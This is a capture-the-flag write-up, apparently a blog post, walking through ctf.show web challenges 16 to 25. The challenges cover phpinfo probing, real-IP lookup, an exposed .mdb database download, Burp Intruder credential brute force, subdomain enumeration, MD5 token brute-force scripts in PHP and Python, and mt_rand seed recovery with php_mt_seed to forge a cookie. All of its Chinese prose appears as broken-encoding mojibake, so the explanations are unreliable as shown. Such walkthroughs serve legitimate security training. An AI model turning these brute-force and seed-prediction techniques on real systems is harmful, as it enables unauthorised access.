href="#web16">¬∂</a>web16</h3><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÔºåÂ≠òÂú®Êé¢Èíà</p><blockquote><p>phpÊé¢ÈíàÊòØÁî®Êù•Êé¢ÊµãÁ©∫Èó¥„ÄÅÊúçÂä°Âô®ËøêË°åÁä∂ÂÜµÂíåPHP‰ø°ÊÅØÁî®ÁöÑÔºåÊé¢ÈíàÂèØ‰ª•ÂÆûÊó∂Êü•ÁúãÊúçÂä°Âô®Á°¨ÁõòËµÑÊ∫ê„ÄÅÂÜÖÂ≠òÂç†Áî®„ÄÅÁΩëÂç°ÊµÅÈáè„ÄÅÁ≥ªÁªüË¥üËΩΩ„ÄÅÊúçÂä°Âô®Êó∂Èó¥Á≠â‰ø°ÊÅØ„ÄÇÊòØ‰∏Ä‰∏™Êü•ÁúãÊúçÂä°Âô®‰ø°ÊÅØÁöÑÂ∑•ÂÖ∑„ÄÇ<br>ÊØîÂ¶ÇÊü•ÁúãÊúçÂä°Âô®ÊîØÊåÅ‰ªÄ‰πàÔºå‰∏çÊîØÊåÅ‰ªÄ‰πàÔºåÁ©∫Èó¥ÈÄüÂ∫¶Á≠âÁ≠âÁä∂ÂÜµÔºÅ</p></blockquote><p>‰∫éÊòØËÆøÈóÆ<code>http://e42c0d7a-d052-485d-bb09-a7c68a6d0214.chall.ctf.show/tz.php</code><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web16/CL_7ZWZ3%24~0%7D3D0Q1PPD86H.png" alt=""><br>ÂÜçÁÇπÂáªphpinfoÊü•Áúã‰ø°ÊÅØ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web16/_NM4E%5B4%60TFQ%7DPP%60%240P2A~72.png" alt=""><br>Âú®È°µÈù¢ÊêúÁ¥¢‰∏Ä‰∏ãctfshowÔºåÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web16/MK%7B%28X5DI52%29LVAPG%7D%7BTJSQE.png" alt=""></p><h3 id="web17"><a class="header-anchor" href="#web17">¬∂</a>web17</h3><p>Ê†πÊçÆÈ¢òÁõÆÔºåÊü•Êâæctfer.comÁöÑÁúüÂÆûipÔºå‰∫éÊòØÁî®fofaÊü•Êâæ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web17/%7BE3HVN%5DBT7C7%7BR%29_G%7DL%29ODI.png" alt=""><br>Êü•Âà∞ipÂú∞ÂùÄ‰∏∫Ôºö111.231.70.44ÔºåÊâÄ‰ª•flag‰∏∫Ôºöflag{111.231.70.44}</p><h3 id="web18"><a class="header-anchor" href="#web18">¬∂</a>web18</h3><p>ÊâìÂºÄÊòØ‰∏Ä‰∏™Ê∏∏ÊàèÔºåÊàë‰ª¨ÂéªÊâæÊâæÂÆÉÁöÑÊñá‰ª∂ÔºåÂú®js‰∏≠ÂèëÁé∞‰∫ÜÂΩìÂàÜÊï∞Â§ß‰∫é100Êó∂ÔºåËµãÂÄºÁöÑ‰∏Ä‰∏≤ÁºñÁ†Å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web18/_%60NIPJPH%606XG7%7BHCOPOJMWC.png" alt=""><br>Êàë‰ª¨ÊãøÂéªunicodeËß£Á†Å‰∏Ä‰∏ã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web18/WHIID%5B%5BUR1Y%5DOL_G0K7H%247G.png" alt=""><br>Ê†πÊçÆÊèêÁ§∫ÔºåËÆøÈóÆ110.phpÔºåÊûÑÈÄ†url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;884e39f8-376a-4d61-9618-ee22fecc3327.chall.ctf.show&#x2F;110.php</span><br></pre></td></tr></table></figure><p>ËÆøÈóÆÂêéÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web18/%60OO6K~50K%60A%7B~0EC%24G%5D_52N.png" alt=""></p><h3 id="web19"><a class="header-anchor" href="#web19">¬∂</a>web19</h3><p>ÊâìÂºÄÊòØ‰∏Ä‰∏™ÁôªÂΩïÊ°ÜÔºåÂè≥ÈîÆÊü•Áúã‰∏Ä‰∏ãÊ∫êÁ†Å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web19/_KY%7DOY%5BDG6ICR%5DH9U~N%600%28E.png" alt=""><br>Ê†πÊçÆphpÊ∫êÁ†ÅÔºåÊàë‰ª¨ÈúÄË¶ÅpostÂèëÈÄÅÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅËøáÂéª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ÂΩìÁî®Êà∑Âêç‰∏∫admin</span><br><span class="line">ÂØÜÁ†Å‰∏∫a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br><span class="line">Âç≥ÂèØËæìÂá∫flag</span><br></pre></td></tr></table></figure><p>ÊûÑÈÄ†ÂèëÈÄÅpostËØ∑Ê±Ç<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web19/%5DK48MGWOC%243%2555U6R%28YHEWA.png" alt=""><br>ÊàêÂäüËé∑Âèñflag</p><h3 id="web20"><a class="header-anchor" href="#web20">¬∂</a>web20</h3><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÔºåÊòØmdbÊñá‰ª∂Ê≥ÑÈú≤</p><blockquote><p>mdbÊñá‰ª∂ÊòØÊó©Êúüasp+accessÊûÑÊû∂ÁöÑÊï∞ÊçÆÂ∫ìÊñá‰ª∂</p></blockquote><p>‰∫éÊòØÊàë‰ª¨ËÆøÈóÆ/db/db.mdbÔºåÂç≥ÊûÑÈÄ†urlÂ¶Ç‰∏ãËÆøÈóÆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5c070a5e-3a51-4904-a668-4385dfa7e714.chall.ctf.show&#x2F;db&#x2F;db.mdb</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web20/A%60M~%5B%5B9GGXE8%7DAG4%7D%29V2~6H.png" alt=""><br>‰∏ãËΩΩdb.mdbÊñá‰ª∂ÂêéÔºåÁî®ËÆ∞‰∫ãÊú¨ÊâìÂºÄÊêúÁ¥¢flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web20/G8QY%29JHUVWV%60KE%40MU9K%7BXOT.png" alt=""><br>ÊàêÂäüËé∑ÂèñÂà∞flag</p><h2 id="ÁàÜÁ†¥-21-28"><a class="header-anchor" href="#ÁàÜÁ†¥-21-28">¬∂</a>ÁàÜÁ†¥(21-28)</h2><h3 id="web21"><a class="header-anchor" href="#web21">¬∂</a>web21</h3><p>È¢òÁõÆÁªô‰∫Ü‰∏Ä‰∏™zipÊñá‰ª∂ÔºåÊâìÂºÄÂêéËß£ÂéãÊòØÁàÜÁ†¥ÁöÑÂ≠óÂÖ∏ÔºåÊàë‰ª¨ÊäìÂåÖ‰∏Ä‰∏ãÁΩëÂùÄÁúãÁúã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/%7DJ%7BI5%243FC%5D0~HWVBF9YEZAA.png" alt=""><br>ÂèëÁé∞Ë¥¶Âè∑ÂíåÂØÜÁ†ÅÈÉΩË¢´base64‰∫ÜÔºåÊàë‰ª¨ÂèëÈÄÅÂà∞intruderÊ®°ÂùóÔºåÁªôÁàÜÁ†¥ÁöÑ‰ΩçÁΩÆÂä†‰∏ä$Á¨¶Âúà‰Ωè<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CNNU1O4C%40XHK3Y5JORN%60Q1V.png" alt=""><br>Âéªbase64Ëß£Á†Å‰∏Ä‰∏ãÁúãÁúãÊ†ºÂºè<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/XNGZCN%286QM%40%40S%40%29%5DCDH5810.png" alt=""><br>Ê†ºÂºèÊòØË¥¶Âè∑:ÂØÜÁ†ÅÔºåÈÇ£Êàë‰ª¨‰ΩøÁî®custom iterator(Ëá™ÂÆö‰πâËø≠‰ª£Âô®)Ê®°ÂùóÔºåÈ¶ñÂÖàÁ¨¨‰∏Ä‰∏™ÊîæË¥¶Âè∑admin<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CVUBPQE_TDC%60%282%7BNFWNJN66.png" alt=""><br>Á¨¨‰∫å‰∏™ÊîæÁ¨¶Âè∑<code>:</code><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/EE%24R8%28LNP_D4TP6_LGD%40WBX.png" alt=""><br>Á¨¨‰∏â‰∏™ÊîæÈ¢òÁõÆÁªôÁöÑÂ≠óÂÖ∏<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/YDJT6U%5B3%7B%7B%5BW3%24LTQU%40S2I7.png" alt=""><br>Êé•ÁùÄÂÜçËøõË°åbase64ÁºñÁ†ÅÔºåËøòÊúâÊääÂêéÈù¢Ëøô‰∏™urlÁºñÁ†ÅÂ≠óÁ¨¶ÊúÄÂ•ΩÂèñÊ∂àÊéâ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/BG65%608Y%28U%5D%5BZ_Z0Q9PIR%7B%40V.png" alt=""><br>ÁÑ∂ÂêéÂ∞±ÊòØattackÂºÄÂßãÁàÜÁ†¥‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/I%40HP%40S%299HT%5DREAIMIUYYV8K.png" alt=""><br>ÁàÜÁ†¥Âá∫ÂØÜÁ†ÅÔºåÊàêÂäüËé∑Âæóflag</p><h3 id="web22"><a class="header-anchor" href="#web22">¬∂</a>web22</h3><p>È¢òÁõÆËÆ©Êàë‰ª¨ÂéªÁàÜÁ†¥ctfer.comÂüüÂêçÔºå‰πüÂ∞±ÊòØÂéªÁàÜÁ†¥Â≠êÂüüÂêçÔºåÁõ¥Êé•‰∏älayer<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/CNI3BQ%29BITHJIJ~2%7B6E%5DFC6.png" alt=""><br>ÁàÜÁ†¥Âá∫ÊúâflagÁöÑÂ≠êÂüüÂêçÔºåËÆøÈóÆÂêéÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/WW7DID%7BTYG1US%60G6%244MWXJI.png" alt=""></p><h3 id="web23"><a class="header-anchor" href="#web23">¬∂</a>web23</h3><p>ÊâìÂºÄÁúãÂà∞phpÊ∫êÁ†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>‰ª£Á†ÅÂÆ°ËÆ°‰∏Ä‰∏ãÔºåËæìÂá∫flagÈúÄË¶ÅÊª°Ë∂≥‰∏§‰∏™Êù°‰ª∂</p><blockquote><p>Ê≥®ÊÑèÔºåÁºñÁ®ã‰∏≠ÊòØ‰ªé0‰∏∫‰∏ãÊ†áÂºÄÂßãÔºåÁ¨¨‰∏Ä‰ΩçÊòØÁ¨¨‰∫å‰∏™Êï∞Â≠ó<br>Á¨¨‰∏ÄÔºå‰º†ÂÖ•ÁöÑtokenÂÄºÁªèËøámd5Âä†ÂØÜÂêéÔºåÁ¨¨1‰Ωç=Á¨¨14‰ΩçÂπ∂‰∏îÁ¨¨14‰Ωç=Á¨¨17‰Ωç<br>Á¨¨‰∫åÔºåÁ¨¨1‰Ωç+Á¨¨14‰Ωç+Á¨¨17‰Ωç√∑Á¨¨1‰ΩçÁ≠â‰∫éÁ¨¨31‰Ωç</p></blockquote><p>Ê†πÊçÆÊ∫êÁ†ÅÊîπ‰∏Ä‰∏ãÔºåÂÜô‰∏™ËÑöÊú¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AuthorÔºödota_st</span></span><br><span class="line"><span class="comment"> * DateÔºö2021/2/2   10:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$dict = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt; <span class="number">36</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;<span class="number">36</span>;$j++)&#123;</span><br><span class="line">        $token = md5($dict[$i].$dict[$j]);</span><br><span class="line">        <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;Âä†ÂØÜÂêéÁöÑmd5ÂÄº‰∏∫Ôºö&quot;</span>.$token).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;Ëß£ÂØÜÂêéÁöÑÂÄº‰∏∫Ôºö&quot;</span>.$dict[$i].$dict[$j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pythonÁâàÊú¨ËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/2 11:58</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b = (str(i) + str(j)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]):</span><br><span class="line">            <span class="keyword">if</span> ((int(m[<span class="number">1</span>:<span class="number">2</span>]) + int(m[<span class="number">14</span>:<span class="number">15</span>]) + int(m[<span class="number">17</span>:<span class="number">18</span>])) / int(m[<span class="number">1</span>:<span class="number">2</span>])) == int(m[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                print(b)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂæóÂà∞Êª°Ë∂≥ÁöÑÂÄºÔºåÂç≥3j<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/1%40X%282I%7D%29WT%40%7DX%7B%7BC%7B%7DW%5BYO3.png" alt=""><br>‰∫éÊòØÊûÑÈÄ†url‰º†ÂèÇtoken=3jÔºåËé∑Âæóflag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/%7DMZ8I%5BI%5BR%2441YZ%29P0%5DA8TU9.png" alt=""></p><h3 id="web24"><a class="header-anchor" href="#web24">¬∂</a>web24</h3><p>ÂÆ°ËÆ°‰ª£Á†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ÂèëÁé∞ÂÖ∂ÂÆûËøôÊòØ‰º™ÈöèÊú∫Êï∞ÔºåÂõ†‰∏∫mt_srangÂ∑≤ÁªèÂõ∫ÂÆö‰∫ÜÔºåÊàë‰ª¨ÂÜô‰∏™‰ª£Á†ÅËøêË°å‰∏Ä‰∏ã</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AuthorÔºödota_st</span></span><br><span class="line"><span class="comment"> * DateÔºö2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line">$result = intval(mt_rand());</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/7%28XX9%5BUBRX8TG%60%5BP4F8M%29%5BA.png" alt=""><br>ÂæóÂà∞1155388967ÔºåÊâÄ‰ª•ÊûÑÊàê?r=1155388967Âç≥ÂèØËé∑Âæóflag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/N9%294NSPFPC1BUE%28KK%24%7B7Q7R.png" alt=""></p><h3 id="web25"><a class="header-anchor" href="#web25">¬∂</a>web25</h3><p>È¶ñÂÖàÂÆ°ËÆ°‰ª£Á†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÁßçÂ≠êÊ≤°ÊúâÁªôÂá∫Ôºå‰ΩÜÂèëÁé∞‰∏Ä‰∏™ÂÖ≥ÈîÆÂú∞ÊñπÔºåÂ∞±ÊòØÊàë‰ª¨ÂèØ‰ª•Êää‰º†ÂÖ•ÁöÑrËÆæÁΩÆ‰∏∫0ÔºåÂç≥?r=0ÔºåÂèØ‰ª•ËæìÂá∫$randÁöÑÂÄºÔºåÊ≠§Êó∂$rand=mt_rand()ÁöÑÂÄºÔºå‰πüÂ∞±ÊòØÈöèÊú∫Êï∞ÁöÑÂÄº<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/NM0%607T~RI%28QV7UQDCA%5B5%7DQT.png" alt=""><br>Ëé∑ÂæóÈöèÊú∫Êï∞‰∏∫86715576ÔºåËøô‰∏™Êó∂ÂÄôÊàë‰ª¨‰ΩøÁî®ÈÄÜÊé®Â∑•ÂÖ∑Â∞ùËØïÈÄÜÊé®Âá∫ÁßçÂ≠ê</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â∑•ÂÖ∑Âú∞ÂùÄÔºöhttps:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br><span class="line"></span><br><span class="line">git‰∏ãËΩΩÊñπÂºèÔºögit clone https:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br><span class="line">‰∏ãËΩΩÂêéÂëΩ‰ª§Ë°åËæìÂÖ•makeÁÑ∂ÂêéÂõûËΩ¶ÁºñËØëÂá∫php_mt_seedÊñá‰ª∂</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_0%286QB7%245ME%24XVJ%5B2P8HMT0.png" alt=""><br>ÂæóÂà∞ÁßçÂ≠ê‰∏∫4188754181ÔºåÂõ†‰∏∫$_COOKIE[‚Äòtoken‚Äô]ÁöÑÂÄºË¶ÅÁ≠â‰∫é‰∏§‰∏™ÈöèÊú∫Êï∞Áõ∏Âä†Ôºå‰∫éÊòØÊàë‰ª¨ÂÜô‰∏™ËÑöÊú¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AuthorÔºödota_st</span></span><br><span class="line"><span class="comment"> * DateÔºö2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">4188754181</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$result = mt_rand()+mt_rand();</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure><p><img 